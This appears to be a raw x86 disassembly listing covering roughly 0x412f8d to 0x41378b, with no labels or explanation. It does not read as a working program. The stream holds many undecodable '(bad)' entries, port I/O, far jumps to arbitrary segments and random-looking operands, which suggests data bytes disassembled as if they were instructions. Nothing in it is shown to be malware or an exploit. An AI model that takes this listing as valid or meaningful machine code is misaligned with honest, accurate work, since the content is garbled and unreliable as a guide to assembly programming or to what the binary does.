  412f8d:	(bad)  
  412f8e:	std    
  412f8f:	push   ds
  412f90:	xchg   BYTE PTR [edi+0x6a],dh
  412f93:	cmp    DWORD PTR fs:[esi-0x298dda09],ebx
  412f9a:	loope  0x412f51
  412f9c:	pusha  
  412f9d:	xor    eax,0x6aa81a67
  412fa2:	fist   DWORD PTR [edi-0x4b]
  412fa5:	or     edi,ebx
  412fa7:	xchg   ebp,eax
  412fa8:	loopne 0x412fca
  412faa:	ror    DWORD PTR [edx+0x4f],1
  412fad:	jno    0x412fdd
  412faf:	fdivr  QWORD PTR [eax+0x44439bff]
  412fb5:	mov    al,0xe9
  412fb7:	xchg   esp,eax
  412fb8:	retf   0x9b20
  412fbb:	mov    cl,0x72
  412fbd:	adc    al,0xc5
  412fbf:	test   eax,0xc643668a
  412fc4:	ret    0x2c5
  412fc7:	cmp    bh,BYTE PTR [eax]
  412fc9:	push   cs
  412fca:	dec    edi
  412fcb:	mov    bl,0xbb
  412fcd:	sub    eax,0x2dc9dd6f
  412fd2:	loopne 0x412f67
  412fd4:	out    0x64,al
  412fd6:	sub    esp,DWORD PTR [esi-0x3c43be5c]
  412fdc:	jne    0x412fc0
  412fde:	add    eax,0x789644f3
  412fe3:	sahf   
  412fe4:	push   es
  412fe5:	jmp    0x61da:0x495626e2
  412fec:	ret    
  412fed:	bound  edx,QWORD PTR ds:0xec415e
  412ff3:	mov    bl,bh
  412ff5:	into   
  412ff6:	adc    al,0x7f
  412ff8:	sbb    edi,DWORD PTR [ebx]
  412ffa:	imul   ebp,DWORD PTR [ebp+ebp*4-0x3f],0x6da2f1aa
  413002:	inc    esp
  413003:	cwde   
  413004:	push   ebx
  413005:	sub    bh,dl
  413007:	repz add eax,0x45702156
  41300d:	ficomp WORD PTR [edi-0x687305cc]
  413013:	call   0x5021a3a8
  413018:	out    dx,al
  413019:	mov    dl,0x85
  41301b:	xchg   ecx,eax
  41301c:	out    0xb1,eax
  41301e:	dec    edx
  41301f:	push   esi
  413020:	in     eax,dx
  413021:	push   esi
  413022:	outs   dx,BYTE PTR ds:[esi]
  413023:	pop    es
  413024:	dec    ebx
  413025:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413026:	sub    eax,0x6eb8fc47
  41302b:	es into 
  41302d:	arpl   WORD PTR [ecx-0x59],di
  413030:	fadd   st(1),st
  413032:	sub    al,0x24
  413034:	ins    DWORD PTR es:[edi],dx
  413035:	inc    esi
  413036:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413037:	xor    DWORD PTR [ecx-0x4e],esp
  41303a:	retf   0x564c
  41303d:	push   ebp
  41303e:	int3   
  41303f:	adc    esp,DWORD PTR [edi+0x72e1d122]
  413045:	cs pop esp
  413047:	pop    ecx
  413048:	mov    ebp,0x43a4c7a3
  41304d:	cwde   
  41304e:	sbb    al,BYTE PTR [ebx-0x1f]
  413051:	mov    DWORD PTR [ecx+0x17],esi
  413054:	xor    eax,0xd0a38368
  413059:	jecxz  0x41306b
  41305b:	imul   ebx,DWORD PTR [eax+0x4929daab],0xffffffe7
  413062:	adc    ebx,edx
  413064:	pusha  
  413065:	ror    DWORD PTR [edx],cl
  413067:	sbb    al,0xc
  413069:	aas    
  41306a:	das    
  41306b:	mov    edx,DWORD PTR [edx+esi*2]
  41306e:	mov    esp,0xc584b8f9
  413073:	mov    esp,0xbce3f5e
  413078:	xchg   BYTE PTR [ecx+0x15],bl
  41307b:	push   ebp
  41307c:	jecxz  0x4130e3
  41307e:	enter  0x69bb,0xac
  413082:	dec    edi
  413083:	adc    eax,0xcacd372c
  413088:	xchg   ebp,eax
  413089:	in     eax,dx
  41308a:	fwait
  41308b:	into   
  41308c:	inc    esi
  41308d:	mov    ds:0xa12ab646,al
  413092:	lods   al,BYTE PTR ds:[esi]
  413093:	pop    es
  413094:	mov    edx,0x2e3ca19a
  413099:	jns    0x413115
  41309b:	ss stos DWORD PTR es:[edi],eax
  41309d:	inc    esi
  41309e:	retf   0xf5e8
  4130a1:	js     0x413050
  4130a3:	fs in  al,dx
  4130a5:	jp     0x413047
  4130a7:	cdq    
  4130a8:	adc    eax,0xc99515a4
  4130ad:	dec    edx
  4130ae:	and    edx,DWORD PTR [edi+0x4e]
  4130b1:	mov    ebp,0x6bdad7f4
  4130b6:	push   edi
  4130b7:	test   ah,ch
  4130b9:	test   al,0x27
  4130bb:	dec    edi
  4130bc:	jno    0x4130c1
  4130be:	jbe    0x41310c
  4130c0:	push   cs
  4130c1:	or     edx,edx
  4130c3:	mov    dl,0x70
  4130c5:	ins    BYTE PTR es:[edi],dx
  4130c6:	fsub   DWORD PTR [ecx-0x15fc386d]
  4130cc:	stos   DWORD PTR es:[edi],eax
  4130cd:	jmp    0x7bbd3edb
  4130d2:	jne    0x413098
  4130d4:	lods   eax,DWORD PTR ds:[esi]
  4130d5:	sti    
  4130d6:	pop    ss
  4130d7:	pushf  
  4130d8:	pop    ss
  4130d9:	inc    ebx
  4130da:	rcl    DWORD PTR [esi-0x51e92be9],0x53
  4130e1:	sub    BYTE PTR [eax+eiz*8-0x5a],0xa8
  4130e6:	xchg   ebp,eax
  4130e7:	sub    al,0x30
  4130e9:	xchg   edx,eax
  4130ea:	and    eax,0xf45f30c9
  4130ef:	ins    BYTE PTR es:[edi],dx
  4130f0:	cvtps2pi mm4,QWORD PTR ds:0xea03592d
  4130f7:	add    ah,BYTE PTR [ebx+eax*8]
  4130fa:	lods   eax,DWORD PTR ds:[esi]
  4130fb:	pmaddwd mm5,QWORD PTR [ebx-0x4322793f]
  413102:	dec    esp
  413103:	sub    al,0xa3
  413105:	fldln2 
  413107:	loop   0x41317a
  413109:	mov    cl,0xe9
  41310b:	mov    ebx,0xec25d3fc
  413110:	imul   BYTE PTR [ebx-0x4e]
  413113:	xor    BYTE PTR [ebp-0x1ad1c267],ch
  413119:	jmp    0x36e364bd
  41311e:	ja     0x4130f0
  413120:	daa    
  413121:	pop    ss
  413122:	ja     0x41318d
  413124:	mov    esp,0x6280d8d3
  413129:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41312a:	hlt    
  41312b:	jne    0x413120
  41312d:	dec    edx
  41312e:	or     DWORD PTR [edi],0x95826d7c
  413134:	adc    BYTE PTR [ebx+0xc],bl
  413137:	xchg   edi,eax
  413138:	push   es
  413139:	shl    bh,1
  41313b:	scas   eax,DWORD PTR es:[edi]
  41313c:	jno    0x4131b3
  41313e:	sbb    ebp,DWORD PTR [ebx-0x602660de]
  413144:	adc    al,0xe7
  413146:	mov    WORD PTR [esi+edx*4-0x70],?
  41314a:	div    dl
  41314c:	inc    edx
  41314d:	in     eax,0xa6
  41314f:	mov    cl,0xe1
  413151:	div    cl
  413153:	(bad)  
  413154:	cmc    
  413155:	or     cl,bl
  413157:	pop    edx
  413158:	out    0xb7,al
  41315a:	test   cl,0xab
  41315d:	sub    DWORD PTR es:[ebx-0x4e],edx
  413161:	or     bh,dl
  413163:	sbb    BYTE PTR [ebp+0x771fe85f],dl
  413169:	dec    esp
  41316a:	mov    ds:0xe05452af,al
  41316f:	fcom   DWORD PTR [edi+0x73c99b2c]
  413175:	loop   0x413109
  413177:	adc    BYTE PTR [esi+ebx*4-0x2c],bh
  41317b:	(bad)  
  41317c:	rol    DWORD PTR [edx+ecx*8],1
  41317f:	adc    BYTE PTR [eax],ah
  413181:	(bad)
  413184:	sub    ebx,edi
  413186:	dec    eax
  413187:	xchg   ebx,eax
  413188:	add    dh,BYTE PTR [esi-0x12645c0e]
  41318e:	adc    ch,BYTE PTR [ebx]
  413190:	push   edi
  413191:	lods   al,BYTE PTR ds:[esi]
  413192:	(bad)  
  413193:	lods   al,BYTE PTR ds:[esi]
  413194:	push   esp
  413195:	xchg   BYTE PTR [ebp-0x47],ah
  413198:	add    eax,0xd591a724
  41319d:	mov    cl,0x2c
  41319f:	stos   BYTE PTR es:[edi],al
  4131a0:	inc    ebx
  4131a1:	jp     0x413199
  4131a3:	or     al,0x21
  4131a5:	dec    ebx
  4131a6:	cmp    eax,0xe83ac12d
  4131ab:	sub    al,0x51
  4131ad:	pop    eax
  4131ae:	data16 jne 0x4131a1
  4131b1:	jl     0x4131f4
  4131b3:	lods   al,BYTE PTR ds:[esi]
  4131b4:	loope  0x41316b
  4131b6:	xchg   esi,eax
  4131b7:	jbe    0x4131e1
  4131b9:	ja     0x413212
  4131bb:	mov    esi,0xdf3c921f
  4131c0:	jo     0x41316e
  4131c2:	adc    al,ch
  4131c4:	and    eax,0xab3f0999
  4131c9:	cmp    BYTE PTR [ebx],al
  4131cb:	sub    dh,BYTE PTR [ecx+0x7b]
  4131ce:	sbb    bl,BYTE PTR [ebx+0x33]
  4131d1:	sbb    edx,DWORD PTR [eax-0x36]
  4131d4:	retf   
  4131d5:	repnz cmp cl,BYTE PTR [edx-0x4fcb2567]
  4131dc:	xchg   edi,ebp
  4131de:	jns    0x4131fa
  4131e0:	test   al,0x9e
  4131e2:	jge    0x413172
  4131e4:	popa   
  4131e5:	pop    esi
  4131e6:	or     dh,BYTE PTR [ebx+ebx*2-0x63]
  4131ea:	sbb    cl,BYTE PTR ds:[ecx]
  4131ed:	pop    edi
  4131ee:	mov    esp,0x200a4b9c
  4131f3:	cmp    ecx,DWORD PTR ds:0xb20addb2
  4131f9:	das    
  4131fa:	jge    0x4131ee
  4131fc:	ss and al,0xad
  4131ff:	jmp    0x413255
  413201:	mov    eax,0x5f492438
  413206:	sub    eax,0xc40cd010
  41320b:	(bad)  
  41320c:	lds    edx,FWORD PTR [ebp-0x5682a58f]
  413212:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413213:	cmp    BYTE PTR [esi-0x6312797a],dh
  413219:	int3   
  41321a:	repnz mov edi,0x36037977
  413220:	in     eax,0x8c
  413222:	mov    DWORD PTR [edx-0x62],esp
  413225:	(bad)
  413228:	xchg   DWORD PTR [ecx+ebp*8],ebp
  41322b:	adc    ah,BYTE PTR [ebp+0x3a]
  41322e:	inc    esp
  41322f:	dec    eax
  413230:	or     DWORD PTR [ebp+ebx*4-0x6a8c51f5],esp
  413237:	aas    
  413238:	cmp    BYTE PTR [esi+0x6e2047b8],ah
  41323e:	cmp    DWORD PTR [eax+0x513839d1],ecx
  413244:	jge    0x4131e3
  413246:	rcr    BYTE PTR [esi+edx*8+0x17],cl
  41324a:	and    dl,BYTE PTR [esi]
  41324c:	mov    eax,0xd7caed6
  413251:	pop    ss
  413252:	inc    ebp
  413253:	add    edi,ecx
  413255:	clc    
  413256:	or     edx,ebx
  413258:	push   eax
  413259:	mov    cl,0xa4
  41325b:	jmp    0x15e5:0x23fad8ff
  413262:	jo     0x4131ff
  413264:	xlat   BYTE PTR ds:[ebx]
  413265:	xchg   DWORD PTR [ecx-0x7faeecc5],esp
  41326b:	push   es
  41326c:	data16 data16 xlat BYTE PTR ds:[ebx]
  41326f:	push   ebp
  413270:	mov    ds:0x279888cd,al
  413275:	mov    WORD PTR [ebp-0x68b6a42a],?
  41327b:	es jp  0x41326b
  41327e:	adc    ch,BYTE PTR [ebx]
  413280:	js     0x4132d2
  413282:	not    DWORD PTR [ecx-0x3c]
  413285:	sub    BYTE PTR [edx+0x1b714ac0],bh
  41328b:	and    DWORD PTR [ecx+0x6f],ebp
  41328e:	addr16 pop ebx
  413290:	fdivr  DWORD PTR [ebx+0xb]
  413293:	jecxz  0x4132ba
  413295:	imul   ebx,DWORD PTR [eax-0x5d37922c],0x246c7aef
  41329f:	pushf  
  4132a0:	pop    edx
  4132a1:	lahf   
  4132a2:	in     eax,0x93
  4132a4:	mov    esi,0x8dfffd9f
  4132a9:	imul   edx,DWORD PTR [edx],0x7d
  4132ac:	dec    ebp
  4132ad:	cmp    ecx,DWORD PTR [ecx+0x1587e199]
  4132b3:	inc    esp
  4132b4:	cmp    bh,BYTE PTR [ecx+esi*8+0x5d88f62c]
  4132bb:	or     bl,BYTE PTR [ebx+0x1d42abf3]
  4132c1:	sbb    al,0xbc
  4132c3:	neg    BYTE PTR [edx+0xe609d1b]
  4132c9:	or     al,0x65
  4132cb:	call   0x6758cb19
  4132d0:	(bad)  
  4132d2:	dec    ebp
  4132d3:	imul   ecx,esi,0xffffffcd
  4132d6:	std    
  4132d7:	je     0x413301
  4132d9:	or     eax,0xde690bc6
  4132de:	in     eax,dx
  4132df:	arpl   WORD PTR [edx+0x6359d574],dx
  4132e5:	mov    eax,0xf59d9fbd
  4132ea:	ja     0x413335
  4132ec:	and    al,0xea
  4132ee:	sub    eax,0xa9eaba8b
  4132f3:	pop    esp
  4132f4:	lods   eax,DWORD PTR ds:[esi]
  4132f5:	out    dx,al
  4132f6:	xor    DWORD PTR [esi-0x26],eax
  4132f9:	mov    ds:0x45cc97df,al
  4132fe:	pop    edx
  4132ff:	xlat   BYTE PTR ds:[ebx]
  413300:	out    0xd5,eax
  413302:	ins    DWORD PTR es:[edi],dx
  413303:	pop    eax
  413304:	fild   QWORD PTR [eax]
  413306:	das    
  413307:	mov    ch,0x4f
  413309:	adc    al,0x59
  41330b:	cli    
  41330c:	aaa    
  41330d:	and    BYTE PTR [edi+0x6e711e72],dh
  413313:	xor    esi,DWORD PTR [esi+0x3312d4fa]
  413319:	retf   0xe8a0
  41331c:	sbb    BYTE PTR [ecx-0x1585f17b],ah
  413322:	loope  0x413329
  413324:	or     BYTE PTR [esi+0x2d],bl
  413327:	push   eax
  413328:	mov    al,ds:0x155b4c6
  41332d:	(bad)  
  41332f:	push   esi
  413330:	xchg   ebx,eax
  413331:	cmp    al,0x88
  413333:	sahf   
  413334:	jns    0x4132d2
  413336:	mov    esp,0xb8b7d5af
  41333b:	mov    dh,0xc9
  41333d:	dec    ebp
  41333e:	fstp   st(4)
  413340:	mov    ebp,0x132cae34
  413345:	clc    
  413346:	xchg   ecx,eax
  413347:	fisub  WORD PTR [ebx]
  413349:	add    al,0xe0
  41334c:	mov    esp,DWORD PTR [ebx+0x2f4eb454]
  413352:	pop    es
  413353:	xor    cl,BYTE PTR [ebx]
  413355:	jge    0x413379
  413357:	mov    ah,0x9f
  413359:	mov    ds:0xc1470b55,al
  41335e:	pusha  
  41335f:	shl    BYTE PTR [eax+ecx*8-0x12176416],1
  413366:	adc    eax,0x2b86a1b0
  41336b:	outs   dx,DWORD PTR ds:[esi]
  41336c:	es jp  0x41338c
  41336f:	fsub   QWORD PTR [edi]
  413371:	ret    
  413372:	enter  0x1b35,0x64
  413376:	ffreep st(0)
  413378:	jnp    0x4133b2
  41337a:	gs clc 
  41337c:	test   al,0x1e
  41337e:	jno    0x4133c9
  413380:	push   eax
  413381:	pop    edi
  413382:	out    0x40,eax
  413384:	push   0x78
  413386:	into   
  413387:	dec    esi
  413388:	call   0x5c3e3df4
  41338d:	push   0x9ad61147
  413392:	out    dx,eax
  413393:	stos   BYTE PTR es:[edi],al
  413394:	enter  0xa8d0,0xde
  413398:	push   eax
  413399:	das    
  41339a:	test   BYTE PTR [esp+ebx*1+0x6d],dh
  41339e:	or     ebx,DWORD PTR ds:0x6be1c86f
  4133a4:	xor    DWORD PTR [ebp+0x7c],ecx
  4133a7:	ret    
  4133a8:	int    0x2c
  4133aa:	int3   
  4133ab:	pop    esp
  4133ac:	hlt    
  4133ad:	jb     0x4133d3
  4133af:	ret    
  4133b0:	or     al,0xc6
  4133b3:	test   DWORD PTR [esi+ebx*1],0x70224242
  4133ba:	and    eax,0xffc3ddd4
  4133bf:	or     DWORD PTR [edi+0x14cc8541],esi
  4133c5:	dec    ecx
  4133c6:	inc    ecx
  4133c7:	out    0x68,eax
  4133c9:	pop    ecx
  4133ca:	adc    DWORD PTR [edi-0x1eb83ada],edx
  4133d0:	shrd   DWORD PTR [ecx+0x3c],edi,0x5a
  4133d5:	bound  ebp,QWORD PTR [ecx]
  4133d7:	mov    bl,0xec
  4133d9:	pop    ebp
  4133da:	cs mov edi,0xeb578ddb
  4133e0:	lock xchg esi,eax
  4133e2:	cld    
  4133e3:	aas    
  4133e4:	jmp    0x41341f
  4133e6:	inc    ebp
  4133e7:	loopne 0x4133bb
  4133e9:	pusha  
  4133ea:	jnp    0x4133cf
  4133ec:	push   es
  4133ed:	popa   
  4133ee:	dec    ebp
  4133ef:	rcr    DWORD PTR [ebx-0x7f31c2c3],0xfd
  4133f6:	jbe    0x4133cf
  4133f8:	and    edi,DWORD PTR [esi+ecx*8]
  4133fb:	mov    esi,0xf32f96a5
  413400:	push   ds
  413401:	xchg   esp,eax
  413402:	aam    0x69
  413404:	scas   al,BYTE PTR es:[edi]
  413405:	data16 mov ah,0xe5
  413408:	dec    ecx
  413409:	aaa    
  41340a:	sti    
  41340b:	jl     0x413427
  41340d:	pushf  
  41340e:	xor    al,0x4
  413410:	push   eax
  413411:	or     al,0xa1
  413413:	lods   eax,DWORD PTR ds:[esi]
  413414:	dec    ebp
  413415:	imul   sp,WORD PTR [eax+0x1b],0x9a59
  41341b:	(bad)  
  41341d:	mov    DWORD PTR [esi],esi
  41341f:	mov    ebx,0x34b82fb9
  413424:	lods   eax,DWORD PTR ds:[esi]
  413425:	out    0xc6,eax
  413427:	rcr    esp,cl
  413429:	sbb    bh,ch
  41342b:	cmovo  ebx,DWORD PTR [ecx-0x77]
  41342f:	test   DWORD PTR [ecx+ebx*1+0x7a3c51d8],ebp
  413436:	or     al,0x33
  413438:	js     0x4133f3
  41343a:	repz lahf 
  41343c:	jl     0x4133dd
  41343e:	les    ebp,FWORD PTR [ebp+0x27]
  413441:	pop    esp
  413442:	pop    ebp
  413443:	xchg   ah,ah
  413445:	push   ss
  413446:	or     eax,0xd71621b1
  41344b:	addr16 inc ebx
  41344d:	cmp    eax,0x3276b306
  413452:	mov    esp,0xf26b3733
  413457:	cmp    ebx,esi
  413459:	sub    BYTE PTR [esi],0x3d
  41345c:	mov    ebx,DWORD PTR ds:0x1ba3d184
  413462:	ror    BYTE PTR [esi+0x74],1
  413465:	sbb    BYTE PTR [ecx+ebp*1-0x3ee2c85b],dh
  41346c:	pop    eax
  41346d:	fisttp WORD PTR cs:[esp+edx*4+0x22711ade]
  413475:	popf   
  413476:	inc    edi
  413477:	fidiv  WORD PTR [ebx]
  413479:	int3   
  41347a:	cmp    esp,0xfffffffa
  41347d:	xlat   BYTE PTR ds:[ebx]
  41347e:	adc    al,0x98
  413480:	cli    
  413481:	mov    eax,0x3d76a5
  413486:	or     al,0x57
  413488:	xor    ebp,DWORD PTR [ebp-0x19]
  41348b:	or     ebp,DWORD PTR [eax+0x43]
  41348e:	xlat   BYTE PTR ds:[ebx]
  41348f:	adc    DWORD PTR [ebx-0x157d7ff9],0x1928ece0
  413499:	cdq    
  41349a:	mov    ds:0x4bede522,eax
  41349f:	pop    es
  4134a0:	push   ebx
  4134a1:	sbb    DWORD PTR [ebx+0x8],0xd6ccb61f
  4134a8:	mov    ch,0xb
  4134aa:	jle    0x41344f
  4134ac:	pop    ebp
  4134ad:	and    eax,0x7b21fa05
  4134b2:	cmp    ch,BYTE PTR [edx+0x9]
  4134b5:	mov    edx,0xc901d635
  4134ba:	dec    esi
  4134bb:	push   esi
  4134bc:	aad    0x78
  4134be:	xchg   ch,cl
  4134c0:	pop    edx
  4134c1:	scas   al,BYTE PTR es:[edi]
  4134c2:	pop    ecx
  4134c3:	dec    edi
  4134c4:	mov    ds:0xe89c7989,al
  4134c9:	jbe    0x4134e8
  4134cb:	idiv   BYTE PTR [edx]
  4134cd:	in     eax,dx
  4134ce:	leave  
  4134cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134d0:	ins    DWORD PTR es:[edi],dx
  4134d1:	shl    BYTE PTR [esi+edi*8+0x350dc6b5],1
  4134d8:	(bad)  
  4134d9:	or     eax,0xd3badaf9
  4134de:	cmp    eax,DWORD PTR [ecx-0x76]
  4134e1:	retf   
  4134e2:	xchg   ecx,eax
  4134e3:	out    0xc3,al
  4134e5:	cli    
  4134e6:	jbe    0x4134d6
  4134e8:	pusha  
  4134e9:	cli    
  4134ea:	dec    esp
  4134eb:	stos   DWORD PTR es:[edi],eax
  4134ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134ed:	(bad)  [eax]
  4134ef:	xchg   DWORD PTR [eax-0x69],edi
  4134f2:	inc    ebp
  4134f3:	loope  0x413568
  4134f5:	jecxz  0x4134fe
  4134f7:	fidivr WORD PTR [esi]
  4134f9:	std    
  4134fa:	and    cl,BYTE PTR [esi+0xcc76b67]
  413500:	mov    ecx,0x6fe1604d
  413505:	fidivr WORD PTR [ebx-0x5435872e]
  41350b:	sub    BYTE PTR [edi-0x7807d9bf],ch
  413511:	jge    0x413580
  413513:	pop    esp
  413514:	out    0x6,al
  413516:	jge    0x4134e4
  413518:	sar    BYTE PTR [bp+0x3d],0x33
  41351d:	xchg   ch,cl
  41351f:	fstp   DWORD PTR [edx-0x4c5e0a4f]
  413525:	xlat   BYTE PTR ds:[ebx]
  413526:	pop    ebp
  413527:	pushf  
  413528:	dec    esp
  413529:	out    0x35,al
  41352b:	rcl    BYTE PTR [edx],0x5e
  41352e:	xchg   ecx,eax
  41352f:	push   cs
  413530:	push   ss
  413531:	lods   al,BYTE PTR ds:[esi]
  413532:	cmp    eax,0xc407197f
  413537:	fadd   DWORD PTR [edx+esi*8-0x530589db]
  41353e:	push   ebp
  41353f:	jge    0x4134c6
  413541:	(bad)  
  413542:	cmc    
  413543:	push   ebx
  413544:	jmp    0x7626:0xa8bbeb6c
  41354b:	adc    BYTE PTR [edx],ch
  41354d:	push   esi
  41354e:	rcl    DWORD PTR [edx],0x10
  413551:	hlt    
  413552:	mov    ebp,0xbce6f509
  413557:	fmul   DWORD PTR [ecx+0x6e83c61e]
  41355d:	mov    ch,0x6f
  41355f:	rcr    BYTE PTR [edx+eiz*4+0x5d395e06],1
  413566:	jmp    0x4135da
  413568:	mov    esi,0xb42e65ba
  41356d:	into   
  41356e:	xor    DWORD PTR [ebx],edx
  413570:	out    0xe3,eax
  413572:	or     ah,BYTE PTR [edx-0x25c5007e]
  413578:	xchg   DWORD PTR [esi-0x56],ebp
  41357b:	adc    BYTE PTR [ecx+eiz*8],cl
  41357e:	std    
  41357f:	jne    0x41350e
  413581:	test   bl,dl
  413583:	rol    BYTE PTR [edx],1
  413585:	add    al,0x80
  413587:	cmp    ah,al
  413589:	pop    edi
  41358a:	pop    ss
  41358b:	pop    eax
  41358c:	push   ss
  41358d:	add    ch,BYTE PTR [ecx-0x6db79f03]
  413593:	sbb    eax,0xf83bb51a
  413598:	and    eax,0xc3456abb
  41359d:	fdivr  st,st(4)
  41359f:	cmp    al,bl
  4135a1:	nop
  4135a2:	cmp    ebp,ebx
  4135a4:	mov    dl,0xf
  4135a6:	jno    0x413625
  4135a8:	push   es
  4135a9:	arpl   sp,ax
  4135ab:	adc    BYTE PTR [edi+0x6822f31e],al
  4135b1:	or     al,0x21
  4135b3:	ss sbb al,0xc9
  4135b6:	gs xor al,dl
  4135b9:	cmp    al,0xc7
  4135bb:	ss out dx,eax
  4135bd:	or     esp,DWORD PTR [esi]
  4135bf:	inc    esp
  4135c0:	jne    0x413557
  4135c2:	ja     0x413579
  4135c4:	cmp    eax,0xd654284d
  4135c9:	jle    0x4135a8
  4135cb:	push   edx
  4135cc:	pop    edx
  4135cd:	pop    ebp
  4135ce:	adc    esp,DWORD PTR [ecx-0x40]
  4135d1:	pop    ss
  4135d2:	stc    
  4135d3:	mov    ch,0x71
  4135d5:	or     al,0x30
  4135d7:	and    edi,ecx
  4135d9:	aaa    
  4135da:	jmp    0x791945b8
  4135df:	out    dx,al
  4135e0:	add    ebp,0x68ab3c22
  4135e6:	mov    es,WORD PTR [edx]
  4135e8:	mov    eax,0x99eceb58
  4135ed:	adc    DWORD PTR [edx+0x2ea0e55e],eax
  4135f3:	mov    al,ds:0x84fcc7d2
  4135f8:	sub    al,0x98
  4135fa:	neg    esp
  4135fc:	arpl   WORD PTR [ebx-0x19e0d004],bp
  413602:	je     0x41360b
  413604:	(bad)  
  413605:	enter  0x57ea,0x9a
  413609:	stos   BYTE PTR es:[edi],al
  41360a:	scas   al,BYTE PTR es:[edi]
  41360b:	sub    ebx,edi
  41360d:	nop
  41360e:	mov    ecx,0x23cbc1d9
  413613:	pusha  
  413614:	jmp    0x413637
  413616:	loopne 0x4135e0
  413618:	xchg   DWORD PTR [esp+ecx*2+0x7e],ecx
  41361c:	out    dx,eax
  41361d:	popf   
  41361e:	jge    0x413611
  413620:	(bad)  
  413621:	jge    0x413687
  413623:	stc    
  413624:	inc    esi
  413625:	jg     0x4135ab
  413627:	jne    0x413672
  413629:	xor    al,0xdc
  41362b:	pop    ds
  41362c:	dec    ebp
  41362d:	push   edi
  41362e:	pop    ebp
  41362f:	mov    al,0x41
  413631:	xchg   ebx,eax
  413632:	sbb    eax,0x18d7da18
  413637:	sbb    eax,0xa1a8181a
  41363c:	jmp    0x2231ed2d
  413641:	pop    ebp
  413642:	out    dx,eax
  413643:	shl    DWORD PTR [edx+0x64a335b9],cl
  413649:	aas    
  41364a:	retf   
  41364b:	std    
  41364c:	sbb    BYTE PTR [edx+eax*2-0x11],dl
  413650:	inc    esp
  413651:	(bad)
  413655:	lods   al,BYTE PTR ds:[esi]
  413656:	outs   dx,BYTE PTR ds:[esi]
  413657:	stos   DWORD PTR es:[edi],eax
  413658:	fld    DWORD PTR [edx]
  41365a:	xchg   BYTE PTR [edi+0x418592f2],al
  413660:	jmp    0x4136d7
  413662:	cmp    bh,cl
  413664:	jmp    0x4136ae
  413666:	and    eax,0x6ab00384
  41366b:	sahf   
  41366c:	mov    BYTE PTR [edx+0x3512c692],dl
  413672:	retf   0x98d
  413675:	gs repz sbb eax,0x8ef62e58
  41367c:	mov    ebx,0xe54ca4d8
  413681:	push   esi
  413682:	jmp    0x733f:0x2ac3cefd
  413689:	dec    eax
  41368a:	adc    al,0xa4
  41368c:	xchg   ebp,eax
  41368d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41368e:	and    ecx,DWORD PTR [ebx]
  413690:	cwde   
  413691:	fistp  WORD PTR gs:[edi]
  413694:	shr    DWORD PTR [eax-0x11],1
  413697:	jp     0x413670
  413699:	shl    DWORD PTR [ecx-0x39],cl
  41369c:	shl    DWORD PTR ds:0x973d7f82,0xdd
  4136a3:	sbb    BYTE PTR [eax-0x2e3daeeb],dh
  4136a9:	fmul   QWORD PTR [eax+0x5f]
  4136ad:	ins    DWORD PTR es:[edi],dx
  4136ae:	pop    esi
  4136af:	(bad)  
  4136b1:	out    0xc4,eax
  4136b3:	repnz out 0xe,al
  4136b6:	cdq    
  4136b7:	cdq    
  4136b8:	ins    BYTE PTR es:[edi],dx
  4136b9:	and    BYTE PTR cs:[edx+0x41],0xa3
  4136be:	add    eax,0xae6ac624
  4136c3:	imul   esi,DWORD PTR [ecx-0x6fb7ecdb],0x74
  4136ca:	clc    
  4136cb:	mov    al,ds:0xfce9ebfd
  4136d0:	pop    esp
  4136d1:	addr16 fs pop eax
  4136d4:	bound  ecx,QWORD PTR [ebx]
  4136d6:	cmp    eax,0x5516a153
  4136db:	xchg   ecx,eax
  4136dc:	out    dx,eax
  4136dd:	loope  0x4136d6
  4136df:	jg     0x41366f
  4136e1:	push   ebp
  4136e2:	and    ah,cl
  4136e4:	mov    dh,0x8b
  4136e6:	mov    bh,0xd7
  4136e8:	mov    BYTE PTR [esi+0x3],cl
  4136eb:	loopne 0x4136de
  4136ed:	idiv   BYTE PTR [esi]
  4136ef:	jge    0x41371f
  4136f1:	ins    DWORD PTR es:[edi],dx
  4136f2:	int    0xf4
  4136f4:	fdivr  DWORD PTR cs:[ecx-0x5a]
  4136f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136f9:	(bad)  
  4136fb:	aam    0xb1
  4136fd:	jle    0x413702
  4136ff:	xor    al,0xf0
  413701:	lock bound ebp,QWORD PTR [esi+0x10]
  413705:	std    
  413706:	mov    DWORD PTR [ecx-0x15],esp
  413709:	and    eax,0x2c967b8a
  41370e:	xchg   edx,eax
  41370f:	jae    0x4136f1
  413711:	inc    ecx
  413712:	xor    ecx,DWORD PTR [esi-0x35]
  413715:	pushf  
  413716:	cmp    eax,0xeba4eb9f
  41371b:	jle    0x413784
  41371d:	mov    ds:0x2caf4b8b,al
  413722:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413723:	bound  ebp,QWORD PTR [edx+0x4f]
  413726:	scas   al,BYTE PTR es:[edi]
  413727:	sub    edx,ebp
  413729:	sub    eax,0xfda22e0e
  41372e:	dec    esi
  41372f:	mov    esi,ds
  413731:	mov    esp,ecx
  413733:	ds and eax,0xddf6ff43
  413739:	fdiv   DWORD PTR ds:[edi-0x24]
  41373d:	xchg   DWORD PTR gs:[esp+ebx*1-0x62b79fdf],esp
  413745:	out    0x7f,eax
  413747:	mov    edi,DWORD PTR [edx+0x4a78677e]
  41374d:	dec    ecx
  41374e:	cmc    
  41374f:	loop   0x413791
  413751:	add    DWORD PTR [edi-0x1f825f92],esp
  413757:	or     eax,DWORD PTR [ecx+0x71da097b]
  41375d:	arpl   WORD PTR [ecx],ax
  41375f:	jbe    0x4137a4
  413761:	fcmovnbe st,st(7)
  413763:	mov    ebp,DWORD PTR [edx+edi*1+0x3cbf3619]
  41376a:	out    0x8b,al
  41376c:	pop    ebp
  41376d:	fimul  WORD PTR [eax]
  41376f:	clc    
  413770:	js     0x4137ab
  413772:	xchg   esp,eax
  413773:	ror    ebp,1
  413775:	sbb    al,0xe8
  413777:	or     al,0x93
  413779:	mov    edi,0xb17807a6
  41377e:	mov    bh,0xd7
  413780:	loope  0x413761
  413782:	push   es
  413783:	jmp    0xe57d0822
  413788:	add    BYTE PTR [esi+0x5f],ah
  41378b:	cwde   
